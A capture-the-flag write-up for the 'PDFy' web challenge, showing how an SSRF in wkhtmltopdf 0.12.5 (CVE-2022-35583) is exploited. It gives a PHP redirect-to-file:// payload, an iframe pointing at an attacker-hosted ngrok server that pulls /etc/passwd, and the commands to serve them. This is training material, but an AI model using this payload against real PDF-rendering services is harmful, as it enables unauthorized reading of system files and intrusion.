---
description: Easy 🔮 Web
cover: https://i.pinimg.com/564x/01/64/89/0164897c3365508be9e0eed7c8bcedeb.jpg
coverY: 0
layout:
  cover:
    visible: true
    size: hero
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# PDFy

## Web app

The first look at the site is that it has a place to submit a URL

<figure><img src="../../../../.gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>

When we submit one URL, it'll generate it to PDF format. For example:&#x20;

<figure><img src="../../../../.gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>

Using some Burp to see what happens when we submit the URL

<figure><img src="../../../../.gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>

It shows that when we enter a valid URL with the format it gives, we will be directed to a path <mark style="color:red;">**`/static/pdfs/.pdf`**</mark> and then display that PDF on our screen.

What about something that is not as its structure dictates?

This will cause an error and we will receive a message:&#x20;

<figure><img src="../../../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

This shows us that the website uses a tool to convert the URL into a PDF preview. And that tool is <mark style="color:red;">**wkhtmltopdf**</mark>

Let's delve deeper into this tool, such as its version.

After we submit successfully, a PDF preview will appear. Here we can see detailed information in this PDF:

<figure><img src="../../../../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>

As we can see the version <mark style="color:red;">**`wkhtmltopdf`**</mark> use is <mark style="color:red;">**`0.12.5`**</mark>

I have researched this version on Google and recognize it is vulnerable to SSRF which allows an attacker to get initial access into the target's system by injecting an iframe tag with the initial asset IP address on its source. This allows the attacker to take over the whole infrastructure by accessing their internal assets.

[<mark style="color:red;">**`CVE-2022-35583`**</mark>](https://nvd.nist.gov/vuln/detail/CVE-2022-35583) is for <mark style="color:red;">**`wkhtmltopdf 0.12.6`**</mark> and since our version is <mark style="color:red;">**`0.12.5`**</mark>, which means the incidence of this vulnerability is higher.

## Exploit CVE-2022-35583

Based on the analysis, we can interact with the <mark style="color:red;">**`/api/cache`**</mark> URI by sending a POST request with JSON data. This endpoint communicates with the <mark style="color:red;">**`wkhtmltopdf`**</mark> application on the backend. The application expects a URL to be provided, which it will visit, extract the necessary information, and convert the webpage into a PDF file. Finally, the resulting PDF is returned to the main page.

My build and extraction process is based on this [article](https://exploit-notes.hdks.org/exploit/web/security-risk/wkhtmltopdf-ssrf/). For more information about how the CVE works, you can visit and read this [PoC](https://www.virtuesecurity.com/kb/wkhtmltopdf-file-inclusion-vulnerability-2/)

First of all, I'll create a <mark style="color:red;">**`payload.php`**</mark>:

```php
<?php header('location:file://'.$_REQUEST['x']); ?>
```

Because the website allows us to submit a valid URL, so we can build our small site for that

You can use another way to create a server, but I will use [<mark style="color:red;">**`ngrok`**</mark>](#user-content-fn-1)[^1] here

Setup [<mark style="color:red;">**`ngrok`**</mark>](#user-content-fn-2)[^2]:&#x20;

{% code overflow="wrap" %}
```bash
 curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null && echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list && sudo apt update && sudo apt install ngrok
```
{% endcode %}

```bash
ngrok config add-authtoken $YOUR_AUTHTOKEN # Authenticate your ngrok agent
```

```bash
ngrok tcp 127.0.0.1:8000 # Create ngrok tcp server
```

<figure><img src="../../../../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>

Now let's create an <mark style="color:red;">**`index.html`**</mark> file

```html
<!DOCTYPE html>
<html lang=en>
<body>
    <iframe src="http://<NGROK_FORWARDING_IP>/payload.php?x=/etc/passwd" style="height:500px;width:100%"></iframe>
</body>
</html>
```

Save it and the final step is to start a web server on local machine:&#x20;

```bash
php -S 0.0.0.0:8000
```

Now we can submit our website and get a flag:

<figure><img src="../../../../.gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
You can use <mark style="color:red;">**`http://`**</mark> instead of <mark style="color:red;">**`tcp://`**</mark>&#x20;
{% endhint %}

[^1]: Ngrok is a cross-platform application that allows developers to expose their local web servers to the internet. It hosts a local web server on its own sub-domain and makes your local development box available on the internet through Tunnelling.

[^2]: Ngrok is a cross-platform application that allows developers to expose their local web servers to the internet. It hosts a local web server on its own sub-domain and makes your local development box available on the internet through Tunnelling.
